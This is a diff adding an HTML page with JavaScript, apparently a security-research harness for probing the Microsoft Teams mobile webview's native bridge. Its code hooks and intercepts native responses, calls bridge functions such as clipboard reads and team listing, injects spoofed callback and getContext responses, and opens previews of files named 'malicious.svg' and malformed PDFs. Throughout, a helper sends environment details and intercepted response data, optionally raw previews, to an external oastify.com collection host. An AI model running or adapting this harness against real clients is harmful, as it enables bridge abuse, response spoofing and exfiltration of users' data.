@@ -1,0 +1,783 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Teams Mobile Surface Harness</title>
+<style>
+  :root {
+    color-scheme: dark;
+    --bg: #0b0f14;
+    --panel: #151b23;
+    --line: #303944;
+    --text: #d6dde6;
+    --muted: #8b98a7;
+    --ok: #3fb950;
+    --warn: #d29922;
+    --bad: #f85149;
+    --info: #58a6ff;
+    --hot: #f0883e;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 12px;
+  }
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 2;
+    background: #0f151d;
+    border-bottom: 1px solid var(--line);
+    padding: 8px;
+  }
+  h1 { font-size: 15px; margin: 0 0 6px; }
+  .controls, .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(145px, 1fr));
+    gap: 5px;
+  }
+  .settings {
+    display: grid;
+    grid-template-columns: 90px 1fr;
+    gap: 4px 6px;
+    margin-top: 6px;
+    align-items: center;
+  }
+  input[type="text"] {
+    width: 100%;
+    min-width: 0;
+    background: #0b1118;
+    color: var(--text);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 5px;
+    font: inherit;
+  }
+  label { color: var(--muted); }
+  button {
+    min-height: 32px;
+    background: #1c2430;
+    color: var(--text);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 6px;
+    font: inherit;
+    text-align: left;
+  }
+  button.primary { border-color: var(--info); color: var(--info); }
+  button.warn { border-color: var(--warn); color: var(--warn); }
+  button.danger { border-color: var(--bad); color: var(--bad); }
+  button.safe { border-color: var(--ok); color: var(--ok); }
+  main { padding: 8px; }
+  section {
+    border: 1px solid var(--line);
+    background: var(--panel);
+    border-radius: 6px;
+    padding: 7px;
+    margin-bottom: 8px;
+  }
+  section h2 {
+    margin: 0 0 6px;
+    font-size: 12px;
+    color: var(--info);
+  }
+  .row {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    flex-wrap: wrap;
+    margin: 5px 0;
+  }
+  .pill {
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    padding: 2px 7px;
+    color: var(--muted);
+  }
+  #out {
+    white-space: pre-wrap;
+    word-break: break-word;
+    background: #080c10;
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    min-height: 260px;
+    max-height: 58vh;
+    overflow: auto;
+    padding: 8px;
+  }
+  .ok { color: var(--ok); }
+  .warnText { color: var(--warn); }
+  .bad { color: var(--bad); }
+  .info { color: var(--info); }
+  .hot { color: var(--hot); }
+</style>
+</head>
+<body>
+<header>
+  <h1>Teams Mobile Surface Harness</h1>
+  <div class="controls">
+    <button class="primary" onclick="runBaseline()">Run Baseline</button>
+    <button onclick="copyLog()">Copy Log</button>
+    <button onclick="downloadJson()">Download JSON</button>
+    <button onclick="clearLog()">Clear</button>
+  </div>
+  <div class="settings">
+    <label for="oast">OAST</label>
+    <input id="oast" type="text" value="codex.dp6pyv87qcccxhn65h3xau2s1j7av1jq.oastify.com">
+    <label for="base">File Base</label>
+    <input id="base" type="text" value="https://pedrojuniorrd.github.io/_layouts">
+    <label for="customUrl">Custom URL</label>
+    <input id="customUrl" type="text" value="https://pedrojuniorrd.github.io/_layouts/malicious.svg">
+  </div>
+  <div class="row">
+    <label><input id="sendRaw" type="checkbox"> send raw response previews to OAST</label>
+    <label><input id="allowRisky" type="checkbox"> unlock listener/file risky tests</label>
+    <span id="status" class="pill">loading</span>
+  </div>
+</header>
+
+<main>
+  <section>
+    <h2>1. Inventory</h2>
+    <div class="grid">
+      <button class="safe" onclick="dumpEnvironment()">Environment</button>
+      <button class="safe" onclick="dumpNativeInterface()">NativeInterface props</button>
+      <button class="safe" onclick="dumpWebkit()">WebKit handlers</button>
+      <button class="safe" onclick="dumpStateMaps()">Callbacks/handlers maps</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>2. Native Calls, Benign</h2>
+    <div class="grid">
+      <button onclick="sendBridge('getContext', [])">Bridge getContext</button>
+      <button onclick="sendBridge('executeDeepLink', [oastUrl('deeplink-open')])">Bridge executeDeepLink OAST</button>
+      <button onclick="sendBridge('permissions.has', ['media'])">Bridge permissions.has(media)</button>
+      <button onclick="sendBridge('readFromClipboard', [])">Bridge readFromClipboard</button>
+      <button onclick="sendBridge('getUserJoinedTeams', [])">Bridge getUserJoinedTeams</button>
+      <button onclick="sendBridge('tasks.getTaskInfo', [])">Bridge tasks.getTaskInfo</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>3. Transport Comparison</h2>
+    <div class="grid">
+      <button onclick="compareFunction('getContext', [])">Compare getContext</button>
+      <button onclick="compareFunction('executeDeepLink', [oastUrl('cmp-deeplink')])">Compare executeDeepLink</button>
+      <button onclick="validationProbe()">Validation probes</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>4. Response Format / Spoof Proof</h2>
+    <div class="grid">
+      <button class="safe" onclick="dumpCapturedResponses()">Dump captured format</button>
+      <button class="warn" onclick="spoofControlledCallback()">Spoof controlled callback</button>
+      <button class="warn" onclick="spoofGetContextPromise()">Spoof getContext Promise</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>5. WebKit Listener</h2>
+    <div class="grid">
+      <button class="safe" onclick="probeListenerOnly()">Probe listener only</button>
+      <button class="danger" onclick="listenerPostSetup()">listener.postMessage setup</button>
+      <button class="danger" onclick="listenerPostGetContext()">listener.postMessage getContext</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>6. FilePreview Fetch Surface</h2>
+    <div class="grid">
+      <button onclick="openPreviewCustom('svg')">Preview custom as SVG</button>
+      <button onclick="openPreviewCustom('pdf')">Preview custom as PDF</button>
+      <button onclick="openPreviewFromBase('sample.pdf', 'pdf')">Base sample.pdf</button>
+      <button onclick="openPreviewFromBase('malicious.svg', 'svg')">Base malicious.svg</button>
+      <button class="danger" onclick="filePreviewMatrix()">Fetch matrix</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>Output</h2>
+    <div id="out"></div>
+  </section>
+</main>
+
+<script>
+(function () {
+  'use strict';
+
+  var out = document.getElementById('out');
+  var statusEl = document.getElementById('status');
+  var NI = null;
+  var original = {};
+  var msgId = 41000;
+  var records = [];
+  var capturedResponses = [];
+  var sdkReady = false;
+  var teamsLoadError = null;
+
+  function now() {
+    return new Date().toISOString();
+  }
+
+  function cssClass(level) {
+    if (level === 'ok') return 'ok';
+    if (level === 'warn') return 'warnText';
+    if (level === 'bad') return 'bad';
+    if (level === 'hot') return 'hot';
+    return 'info';
+  }
+
+  function log(level, message, data) {
+    var line = '[' + now() + '] [' + level.toUpperCase() + '] ' + message;
+    var div = document.createElement('div');
+    div.className = cssClass(level);
+    div.textContent = line + (data === undefined ? '' : ' ' + safe(data, 3));
+    out.appendChild(div);
+    out.scrollTop = out.scrollHeight;
+    records.push({ ts: now(), level: level, message: message, data: data });
+  }
+
+  function safe(value, depth) {
+    if (depth === undefined) depth = 2;
+    if (depth < 0) return '[depth]';
+    if (value === null) return 'null';
+    if (value === undefined) return 'undefined';
+    var type = typeof value;
+    if (type === 'string') return '"' + value.slice(0, 350) + '"';
+    if (type === 'number' || type === 'boolean') return String(value);
+    if (type === 'function') return '[function ' + (value.name || 'anonymous') + ']';
+    if (Array.isArray(value)) {
+      return '[' + value.slice(0, 12).map(function (v) { return safe(v, depth - 1); }).join(', ') + ']';
+    }
+    if (type === 'object') {
+      var keys;
+      try { keys = Object.getOwnPropertyNames(value); } catch (e) { keys = Object.keys(value); }
+      return '{' + keys.slice(0, 30).map(function (k) {
+        try { return k + ':' + safe(value[k], depth - 1); } catch (e) { return k + ':[err]'; }
+      }).join(', ') + '}';
+    }
+    return String(value);
+  }
+
+  function shortHash(input) {
+    var s = String(input || '');
+    var h = 0;
+    for (var i = 0; i < s.length; i++) h = ((h << 5) - h + s.charCodeAt(i)) | 0;
+    return Math.abs(h).toString(16);
+  }
+
+  function oastHost() {
+    return document.getElementById('oast').value.trim();
+  }
+
+  function oastUrl(path) {
+    return 'https://' + oastHost() + '/' + path + '?ts=' + encodeURIComponent(Date.now());
+  }
+  window.oastUrl = oastUrl;
+
+  function ex(path, data) {
+    var host = oastHost();
+    if (!host) return;
+    var params = [];
+    data = data || {};
+    Object.keys(data).forEach(function (k) {
+      params.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(data[k]).slice(0, 700)));
+    });
+    params.push('ts=' + Date.now());
+    var url = 'https://' + host + '/' + path + '?' + params.join('&');
+    fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(function () {
+      var img = new Image();
+      img.src = url;
+    });
+  }
+
+  function base64Maybe(raw) {
+    if (typeof raw !== 'string' || raw.length < 8) return null;
+    try {
+      var decoded = atob(raw);
+      if (/^[\x09\x0a\x0d\x20-\x7e]+$/.test(decoded.slice(0, 100))) return decoded;
+    } catch (e) {}
+    return null;
+  }
+
+  function parseResponseArgs(args) {
+    var info = {
+      argCount: args.length,
+      argTypes: args.map(function (a) { return typeof a; }),
+      previews: args.map(function (a) { return String(a).slice(0, 160); }),
+      idGuess: null,
+      decodedPreview: null,
+      jsonParse0: null
+    };
+    if (args.length > 1) info.idGuess = String(args[1]);
+    try { info.jsonParse0 = JSON.parse(args[0]); } catch (e) {}
+    var decoded = base64Maybe(args[0]);
+    if (decoded) info.decodedPreview = decoded.slice(0, 240);
+    return info;
+  }
+
+  function hookNativeInterface() {
+    NI = window.nativeInterface || NI;
+    if (!NI || original.hooked) return;
+    original.hooked = true;
+    original.handleResponseFromNative = NI.handleResponseFromNative;
+    original.handlePartialResponseFromNative = NI.handlePartialResponseFromNative;
+    original.handleResponseHandlerFromNative = NI.handleResponseHandlerFromNative;
+    original.framelessPostMessage = NI.framelessPostMessage;
+
+    if (typeof NI.handleResponseFromNative === 'function') {
+      NI.handleResponseFromNative = function () {
+        var args = Array.prototype.slice.call(arguments);
+        var parsed = parseResponseArgs(args);
+        capturedResponses.push({ ts: now(), method: 'handleResponseFromNative', args: args, parsed: parsed });
+        log('hot', 'native response intercepted', parsed);
+        ex('resp/handle', {
+          argCount: parsed.argCount,
+          argTypes: parsed.argTypes.join(','),
+          id: parsed.idGuess || '',
+          hash: shortHash(args.join('|')),
+          preview: document.getElementById('sendRaw').checked ? parsed.previews.join(' | ') : ''
+        });
+        return original.handleResponseFromNative.apply(this, arguments);
+      };
+    }
+
+    if (typeof NI.handlePartialResponseFromNative === 'function') {
+      NI.handlePartialResponseFromNative = function () {
+        var args = Array.prototype.slice.call(arguments);
+        log('hot', 'partial native response', parseResponseArgs(args));
+        return original.handlePartialResponseFromNative.apply(this, arguments);
+      };
+    }
+
+    if (typeof NI.handleResponseHandlerFromNative === 'function') {
+      NI.handleResponseHandlerFromNative = function () {
+        var args = Array.prototype.slice.call(arguments);
+        log('hot', 'response-handler native response', parseResponseArgs(args));
+        return original.handleResponseHandlerFromNative.apply(this, arguments);
+      };
+    }
+
+    log('ok', 'nativeInterface hooked', { props: Object.getOwnPropertyNames(NI).length });
+    ex('ni/hooked', { props: Object.getOwnPropertyNames(NI).length });
+  }
+
+  function ensureNative() {
+    NI = window.nativeInterface || NI;
+    if (!NI) {
+      log('bad', 'window.nativeInterface missing');
+      return false;
+    }
+    return true;
+  }
+
+  function buildRequest(func, args) {
+    return {
+      id: msgId++,
+      func: func,
+      args: args || [],
+      timestamp: Date.now(),
+      apiVersionTag: 'v2_' + String(func).replace(/[^a-zA-Z0-9_.-]/g, '_')
+    };
+  }
+
+  function sendByTransport(transport, func, args) {
+    if (!ensureNative()) return null;
+    var req = buildRequest(func, args);
+    var serialized = JSON.stringify(req);
+    try {
+      if (transport === 'framelessPostMessage') {
+        NI.framelessPostMessage(serialized);
+      } else if (transport === 'sdkRequest') {
+        NI.sdkRequest(serialized);
+      } else if (transport === 'processMessageRequest') {
+        NI.processMessageRequest(serialized);
+      } else {
+        throw new Error('unknown transport ' + transport);
+      }
+      log('info', 'sent ' + func + ' via ' + transport, { id: req.id, args: args });
+      ex('call/' + transport, { id: req.id, func: func, ok: true });
+      return req.id;
+    } catch (e) {
+      log('bad', 'send failed ' + func + ' via ' + transport, e.message);
+      ex('call/' + transport, { id: req.id, func: func, ok: false, err: e.message });
+      return null;
+    }
+  }
+
+  window.sendBridge = function (func, args) {
+    return sendByTransport('framelessPostMessage', func, args || []);
+  };
+
+  window.compareFunction = function (func, args) {
+    ['framelessPostMessage', 'sdkRequest', 'processMessageRequest'].forEach(function (transport, idx) {
+      setTimeout(function () {
+        sendByTransport(transport, func, args || []);
+      }, idx * 700);
+    });
+  };
+
+  window.validationProbe = function () {
+    if (!ensureNative()) return;
+    var probes = [
+      { name: 'missing-id', msg: { func: 'getContext', args: [], timestamp: Date.now() } },
+      { name: 'missing-func', msg: { id: msgId++, args: [], timestamp: Date.now() } },
+      { name: 'string-id', msg: { id: 'abc', func: 'getContext', args: [], timestamp: Date.now() } },
+      { name: 'negative-id', msg: { id: -1, func: 'getContext', args: [], timestamp: Date.now() } }
+    ];
+    probes.forEach(function (p, idx) {
+      setTimeout(function () {
+        var raw = JSON.stringify(p.msg);
+        var valid = null;
+        try { valid = typeof NI.isValidSdkRequest === 'function' ? NI.isValidSdkRequest(raw) : 'no-validator'; } catch (e) { valid = 'error:' + e.message; }
+        log('warn', 'validation probe ' + p.name, { valid: valid, raw: raw });
+        ex('transport/validation', { probe: p.name, valid: valid });
+        try { NI.framelessPostMessage(raw); } catch (e) { log('bad', 'probe send failed', e.message); }
+      }, idx * 500);
+    });
+  };
+
+  window.dumpEnvironment = function () {
+    var data = {
+      href: location.href,
+      origin: location.origin,
+      userAgent: navigator.userAgent,
+      topEqualsSelf: window.top === window,
+      parentEqualsSelf: window.parent === window,
+      hasNativeInterface: !!window.nativeInterface,
+      hasWebkit: !!window.webkit,
+      hasTeams: !!window.microsoftTeams,
+      sdkReady: sdkReady,
+      teamsLoadError: teamsLoadError || ''
+    };
+    log('ok', 'environment', data);
+    ex('env/baseline', {
+      hasNI: data.hasNativeInterface,
+      hasWebkit: data.hasWebkit,
+      topSelf: data.topEqualsSelf,
+      uaHash: shortHash(data.userAgent)
+    });
+  };
+
+  window.dumpNativeInterface = function () {
+    if (!ensureNative()) return;
+    var props = Object.getOwnPropertyNames(NI);
+    var table = props.map(function (p) {
+      var v;
+      try { v = NI[p]; } catch (e) { v = '[get-error]'; }
+      return { name: p, type: typeof v, writable: true };
+    });
+    log('ok', 'nativeInterface properties', table);
+    ex('ni/props', {
+      count: props.length,
+      names: props.join(',').slice(0, 650)
+    });
+  };
+
+  window.dumpWebkit = function () {
+    var mh = window.webkit && window.webkit.messageHandlers;
+    var names = [];
+    if (mh) {
+      try { names = Object.getOwnPropertyNames(mh); } catch (e) { names = Object.keys(mh); }
+    }
+    log(mh ? 'ok' : 'warn', 'webkit messageHandlers', { exists: !!mh, names: names });
+    ex('listener/inventory', { exists: !!mh, names: names.join(',') });
+  };
+
+  window.dumpStateMaps = function () {
+    if (!ensureNative()) return;
+    var cb = NI.callbacks ? Object.keys(NI.callbacks) : [];
+    var handlers = NI.handlers ? Object.keys(NI.handlers) : [];
+    var local = NI.localHandlerMap ? Object.keys(NI.localHandlerMap) : [];
+    log('ok', 'state maps', { callbacks: cb, handlers: handlers, localHandlerMap: local });
+    ex('ni/state', {
+      callbacks: cb.join(','),
+      handlers: handlers.join(','),
+      localHandlerMap: local.join(',')
+    });
+  };
+
+  window.dumpCapturedResponses = function () {
+    log('ok', 'captured response count=' + capturedResponses.length);
+    capturedResponses.forEach(function (r, idx) {
+      log('info', 'response #' + idx, r.parsed);
+    });
+  };
+
+  window.probeListenerOnly = function () {
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    var data = {
+      exists: !!listener,
+      type: typeof listener,
+      hasPostMessage: !!(listener && listener.postMessage),
+      postMessageType: listener && typeof listener.postMessage
+    };
+    log(data.exists ? 'ok' : 'warn', 'listener probe only', data);
+    ex('listener/probe', data);
+  };
+
+  function riskyAllowed(name) {
+    if (!document.getElementById('allowRisky').checked) {
+      log('warn', name + ' blocked: mark "unlock listener/file risky tests" first');
+      return false;
+    }
+    return true;
+  }
+
+  window.listenerPostSetup = function () {
+    if (!riskyAllowed('listener setup')) return;
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    if (!listener || !listener.postMessage) return log('bad', 'listener.postMessage missing');
+    try {
+      var result = listener.postMessage(JSON.stringify({ bridge: 'setup', ts: Date.now() }));
+      log('warn', 'listener setup postMessage returned', result);
+      ex('listener/setup', { ok: true, result: safe(result, 1) });
+    } catch (e) {
+      log('bad', 'listener setup postMessage threw', e.message);
+      ex('listener/setup', { ok: false, err: e.message });
+    }
+  };
+
+  window.listenerPostGetContext = function () {
+    if (!riskyAllowed('listener getContext')) return;
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    if (!listener || !listener.postMessage) return log('bad', 'listener.postMessage missing');
+    var req = buildRequest('getContext', []);
+    try {
+      var result = listener.postMessage(JSON.stringify(req));
+      log('warn', 'listener getContext postMessage returned', result);
+      ex('listener/getContext', { ok: true, id: req.id, result: safe(result, 1) });
+    } catch (e) {
+      log('bad', 'listener getContext postMessage threw', e.message);
+      ex('listener/getContext', { ok: false, id: req.id, err: e.message });
+    }
+  };
+
+  window.openPreviewCustom = function (type) {
+    var url = document.getElementById('customUrl').value.trim();
+    if (!url) return log('bad', 'custom URL empty');
+    openFilePreview(url, type, 'custom-' + type);
+  };
+
+  window.openPreviewFromBase = function (name, type) {
+    var base = document.getElementById('base').value.replace(/\/$/, '');
+    openFilePreview(base + '/' + name, type, name);
+  };
+
+  function openFilePreview(url, type, label) {
+    var size = 2048;
+    var entity = 'surface-' + label + '-' + Date.now();
+    var args = [
+      entity,
+      label,
+      'Teams mobile surface harness',
+      type,
+      url,
+      url,
+      url,
+      '',
+      '',
+      false,
+      '',
+      'view',
+      0,
+      '',
+      size,
+      '',
+      '',
+      '',
+      '',
+      ''
+    ];
+    log('warn', 'openFilePreview', { type: type, url: url, entity: entity });
+    ex('filepreview/sent', { type: type, label: label, url: url });
+    return sendByTransport('framelessPostMessage', 'openFilePreview', args);
+  }
+
+  window.filePreviewMatrix = function () {
+    if (!riskyAllowed('file preview matrix')) return;
+    var files = [
+      ['sample.pdf', 'pdf'],
+      ['malicious.svg', 'svg'],
+      ['p5c-html-as-svg.html', 'svg'],
+      ['p5a-malformed.pdf', 'pdf']
+    ];
+    files.forEach(function (item, idx) {
+      setTimeout(function () {
+        window.openPreviewFromBase(item[0], item[1]);
+      }, idx * 1600);
+    });
+  };
+
+  window.spoofControlledCallback = function () {
+    if (!ensureNative()) return;
+    if (!NI.callbacks) return log('bad', 'NI.callbacks missing');
+    var id = msgId++;
+    NI.callbacks[id] = function () {
+      var args = Array.prototype.slice.call(arguments);
+      log('hot', 'controlled callback fired', args);
+      ex('spoof/controlled-callback-fired', { id: id, args: safe(args, 2) });
+    };
+    var fake = { status: true, reason: 'controlled-spoof-proof', marker: 'surface-harness-' + Date.now() };
+    var encoded = btoa(JSON.stringify(fake));
+    log('warn', 'injecting controlled callback via handleResponseFromNative', { id: id, fake: fake });
+    ex('spoof/controlled-start', { id: id });
+    if (typeof original.handleResponseFromNative === 'function') {
+      original.handleResponseFromNative.call(NI, encoded, String(id));
+    } else if (typeof NI.handleResponseFromNative === 'function') {
+      NI.handleResponseFromNative(encoded, String(id));
+    } else {
+      log('bad', 'handleResponseFromNative missing');
+    }
+  };
+
+  window.spoofGetContextPromise = function () {
+    if (!ensureNative()) return;
+    if (!window.microsoftTeams || !microsoftTeams.app || !microsoftTeams.app.getContext) {
+      return log('bad', 'TeamsJS app.getContext unavailable');
+    }
+    var origFpm = NI.framelessPostMessage;
+    var capturedId = null;
+    NI.framelessPostMessage = function (msg) {
+      var req = null;
+      try { req = JSON.parse(msg); } catch (e) {}
+      if (req && req.func === 'getContext' && capturedId === null) {
+        capturedId = req.id;
+        log('warn', 'blocked native getContext for spoof proof', { id: capturedId });
+        ex('spoof/getContext-blocked', { id: capturedId });
+        setTimeout(function () {
+          var fakeCtx = {
+            user: { userPrincipalName: 'spoof-proof@example.invalid', id: 'spoof-user-id' },
+            app: { host: { clientType: 'ios' } },
+            team: { groupId: 'spoof-team-id' },
+            channel: { id: 'spoof-channel-id', displayName: 'spoof-channel' }
+          };
+          var encoded = btoa(JSON.stringify(fakeCtx));
+          log('warn', 'injecting fake getContext response', { id: capturedId });
+          ex('spoof/getContext-injected', { id: capturedId });
+          var handler = original.handleResponseFromNative || NI.handleResponseFromNative;
+          if (typeof handler === 'function') {
+            handler.call(NI, encoded, String(capturedId));
+          } else {
+            log('bad', 'handleResponseFromNative unavailable for spoof injection');
+          }
+        }, 150);
+        return;
+      }
+      return origFpm.apply(this, arguments);
+    };
+
+    microsoftTeams.app.getContext().then(function (ctx) {
+      log('hot', 'getContext Promise resolved', ctx);
+      ex('spoof/getContext-resolved', {
+        id: capturedId,
+        upn: ctx && ctx.user && ctx.user.userPrincipalName,
+        team: ctx && ctx.team && ctx.team.groupId
+      });
+    }).catch(function (e) {
+      log('bad', 'getContext Promise rejected', e.message || e);
+      ex('spoof/getContext-rejected', { id: capturedId, err: e.message || e });
+    }).finally(function () {
+      setTimeout(function () {
+        NI.framelessPostMessage = origFpm;
+        log('info', 'framelessPostMessage restored after spoof proof');
+      }, 800);
+    });
+  };
+
+  window.runBaseline = function () {
+    window.dumpEnvironment();
+    window.dumpNativeInterface();
+    window.dumpWebkit();
+    window.dumpStateMaps();
+    if (window.microsoftTeams && microsoftTeams.app && microsoftTeams.app.getContext) {
+      microsoftTeams.app.getContext().then(function (ctx) {
+        log('ok', 'TeamsJS getContext resolved', {
+          host: ctx && ctx.app && ctx.app.host && ctx.app.host.clientType,
+          hasUser: !!(ctx && ctx.user),
+          tenant: ctx && ctx.user && ctx.user.tenant && ctx.user.tenant.id
+        });
+        ex('env/getContext', {
+          host: ctx && ctx.app && ctx.app.host && ctx.app.host.clientType,
+          hasUser: !!(ctx && ctx.user)
+        });
+      }).catch(function (e) {
+        log('bad', 'TeamsJS getContext failed', e.message || e);
+      });
+    }
+  };
+
+  window.copyLog = function () {
+    var text = records.map(function (r) {
+      return '[' + r.ts + '] [' + r.level + '] ' + r.message + (r.data === undefined ? '' : ' ' + safe(r.data, 4));
+    }).join('\n');
+    navigator.clipboard.writeText(text).then(function () {
+      log('ok', 'log copied');
+    }).catch(function (e) {
+      log('bad', 'copy failed', e.message || e);
+    });
+  };
+
+  window.downloadJson = function () {
+    var blob = new Blob([JSON.stringify({ records: records, capturedResponses: capturedResponses }, null, 2)], { type: 'application/json' });
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'teams-mobile-surface-' + Date.now() + '.json';
+    a.click();
+    URL.revokeObjectURL(a.href);
+  };
+
+  window.clearLog = function () {
+    out.textContent = '';
+    records = [];
+  };
+
+  function loadTeamsJs() {
+    var script = document.createElement('script');
+    script.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+    script.onload = function () {
+      log('ok', 'TeamsJS loaded');
+      if (!window.microsoftTeams || !microsoftTeams.app) return log('bad', 'microsoftTeams.app missing');
+      microsoftTeams.app.initialize().then(function () {
+        sdkReady = true;
+        statusEl.textContent = 'SDK ready';
+        statusEl.className = 'pill ok';
+        log('ok', 'TeamsJS initialized');
+        ex('env/sdk-ready', { ok: true });
+      }).catch(function (e) {
+        teamsLoadError = e.message || String(e);
+        statusEl.textContent = 'SDK init failed';
+        statusEl.className = 'pill bad';
+        log('bad', 'TeamsJS initialize failed', teamsLoadError);
+        ex('env/sdk-ready', { ok: false, err: teamsLoadError });
+      });
+    };
+    script.onerror = function () {
+      teamsLoadError = 'script load failed';
+      statusEl.textContent = 'SDK load failed';
+      statusEl.className = 'pill bad';
+      log('bad', 'TeamsJS script load failed');
+    };
+    document.head.appendChild(script);
+  }
+
+  hookNativeInterface();
+  var pollCount = 0;
+  var poll = setInterval(function () {
+    pollCount++;
+    hookNativeInterface();
+    if (NI || pollCount > 20) clearInterval(poll);
+  }, 100);
+
+  window.dumpEnvironment();
+  loadTeamsJs();
+})();
+</script>
+</body>
+</html>
